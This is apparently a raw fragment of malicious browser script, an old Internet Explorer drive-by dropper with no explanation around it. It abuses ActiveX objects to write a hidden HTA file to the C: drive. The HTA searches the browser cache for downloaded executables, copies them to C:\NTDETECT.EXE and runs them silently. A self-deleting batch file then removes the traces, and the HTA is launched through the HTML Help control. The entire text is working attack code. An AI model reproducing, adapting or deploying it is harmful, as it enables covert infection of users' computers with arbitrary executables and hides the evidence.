   try{o=new ActiveXObject("ADODB.Recordset");
   o.Fields.Append("a",200,3000);o.Open();o.AddNew();
   o.Fields("a").Value="<HTML><BODY><HEAD><SCRIPT language=JScript>window.moveTo(3000,3000);window.resizeTo(0,0);<\/SCRIPT></HEAD>\r\n<HTA:APPLICATION ID=RAY BORDER=\"none\" CAPTION=\"no\" SHOWINTASKBAR=\"no\">\r\n<BODY scroll=\"no\" leftmargin=\"0\" topmargin=\"0\" marginwidth=\"0\" marginheight=\"0\">\r\n<SCRIPT LANGUAGE=\"JavaScript\">\r\nfunction wj(b){\r\ntry{var c=new Enumerator(fso.GetFolder(b).SubFolders);for (;!c.atEnd();c.moveNext()){var f0=c.item().Path+\"\\\\ray[1].exe\";var f1=c.item().Path+\"\\\\ray[2].exe\";\r\nvar f=\"C:\\\\NTDETECT.EXE\";if(fso.FileExists(f0)){fso.CopyFile(f0,f)\r\nwsh.Run(f,0,false);v=1;}     if(fso.FileExists(f1)){fso.CopyFile(f1,f);wsh.Run(f,0,false);}wj(c.item());}}catch(e){}}\r\nfunction kill(){\r\npath=\"c:\\\\cmd.bat\";\r\nv=RAY.commandLine;\r\nv=v.substring(1,v.length-2);\r\nvar _w=fso.CreateTextFile(path);\r\n_w.Write(\'@echo off\\r\\n:A\\r\\ndel \"\'+v+\'\"\\r\\nif exist \"\'+v+\'\" goto A\\r\\ndel %0\');\r\n_w.close();\r\nwsh.Run(path,0,false);\r\nwindow.close();\r\n}\r\nvar v=0;\r\ntry{\r\nvar fso=new ActiveXObject(\"Scripting.FileSystemObject\");\r\nvar wsh=new ActiveXObject(\"WScript.Shell\");\r\nvar cache=wsh.RegRead(\"HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\Shell Folders\\\\Cache\");\r\n}catch(e){}\r\nfunction drun(){try{if(v==0){wj(cache);setTimeout(\"drun()\",3000);}else{kill();}}catch(e){}}\r\ndrun();<\/SCRIPT></BODY></HTML>";
   o.Update();}
   catch(e){}try{
   o.Save("c:\\NTDETECT.hta",0);}
   catch(e){}document.write('<object id="ray1" type="application/x-oleobject" classid="clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11"><param name="Command" value="shortcut"><param name=item1 value=",c:\\NTDETECT.hta"></object><OBJECT id="ray2" type="application/x-oleobject" classid="clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11"><param name="Command" value="Close"><OBJECT id="ray3" type="application/x-oleobject" classid="clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11"><param name="Command" value="Minimize"><\/object><script>ray1.Click();ray2.Click();ray3.Click();<\/script>')
